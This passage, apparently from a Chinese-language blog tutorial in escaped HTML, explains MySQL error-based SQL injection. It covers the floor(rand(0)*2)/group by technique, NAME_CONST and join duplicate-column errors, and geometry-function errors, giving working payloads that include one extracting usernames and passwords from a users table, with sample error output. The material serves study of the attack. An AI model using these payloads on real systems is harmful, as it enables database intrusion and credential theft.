class=&#34;o&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;三要素显错注入&#34;&gt;三要素显错注入&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;三要素原理分析&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;floor(x) 返回&amp;lt;=x的最大整数&lt;/li&gt;
&lt;li&gt;rand(0) 在给了随机种子0之后，将产生固定伪随机序列&lt;/li&gt;
&lt;li&gt;floor(rand(0)*2) 最终产生的可预测伪随机序列是&#39;011011&amp;hellip;&#39;&lt;/li&gt;
&lt;li&gt;使用count(*) 和 group by统计数据，就是建立虚拟表，对每条记录计算统计键，无则插入，有则+1&lt;/li&gt;
&lt;li&gt;当以foor(rand(0*2))为键使用group by 分组统计时：针对查询表第一条记录，插入前第1次计算值为0，查无此键，进行插入时第2次计算值为1，查无此键，插入即可，实际插入虚拟表的第一条记录键为1；针对查询表第二条记录，插入前第3次计算值为1，查有此键，则直接将count+1，不再进行插入时的计算；针对第三条记录，插入前第4次计算值为0，查无此键，进行插入时第5次计算值为1，查有此键，虚拟表主键唯一，无法插入报错！！！&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;核心其实就是固定的伪随机序列和多次计算&lt;/p&gt;
&lt;p&gt;三要素(count、rand、group by)再加一个要素就是原始&lt;strong&gt;查询表记录至少为3条&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意点&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在查询结果上再执行查询时，必须给定一个别名&lt;/p&gt;
&lt;p&gt;limit 0,1 -&amp;gt; offset + 偏移量 表示最后返回的记录条数&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/weixin_43803070/article/details/96448914&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://blog.csdn.net/weixin_43803070/article/details/96448914&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;常见用法&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and (select 1 from (select count(*), concat(user(), floor(rand(0)*2))x from information_schema.tables group by x)a)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;and&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;concat&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;limit&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;floor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rand&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;information_schema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tables&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;group&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--+
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;注意点：上述两个&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;payload注出来的数据后跟着一个数字&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，因为&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;concat了一个&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;floor&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;rand&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;其他特性利用&#34;&gt;其他特性利用&lt;/h3&gt;
&lt;h4 id=&#34;列名重复&#34;&gt;列名重复&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;原理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;NAME_CONST可以制造一个列，利用列名重复报错&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意点&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;常根据官方文档，name_const函数要求参数必须是&lt;strong&gt;常量&lt;/strong&gt;，所以实际使用上还没有比较好的利用方式。但利用这个特性加上join函数可以爆列名&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;常见用法&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;NAME_CONST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;NAME_CONST&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ERROR&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1060&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;S21&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Duplicate&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;column&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;5.7.17&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;配合&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join获取列名&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ERROR&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1060&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;S21&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Duplicate&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;column&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;等同于配合&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;join使用的on&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ERROR&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1060&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;42&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;S21&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Duplicate&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;column&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;两个&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test表必然每个列都重复&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;using了id列之后&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，就会继续报出第二列错&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;join&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;，&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;报第三列列名&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;几何函数&#34;&gt;几何函数&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;原理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;？？？？报错原理有待考究&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意点&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在版本号为5.5.47上可以用来注入，而在5.7.17上则不行&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;常见用法&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;47&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;可行&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; and (select multipoint((select * from (select * from (select version())a)b)))
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;ERROR 1367 (22007): Illegal non geometric &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;5.5.47&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AS&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dual&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; value found during parsing
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;5.7.17 //失效
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;and&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;multipoint&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ERROR&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1367&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;22007&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Illegal&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;non&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;geometric&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;(select `a`.`version()` from ((select version() AS `version()`) `a`))&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;found&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;during&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;parsing&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;exp等函数&#34;&gt;exp()等函数&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;原理&lt;/strong&gt;&lt;/p&gt;
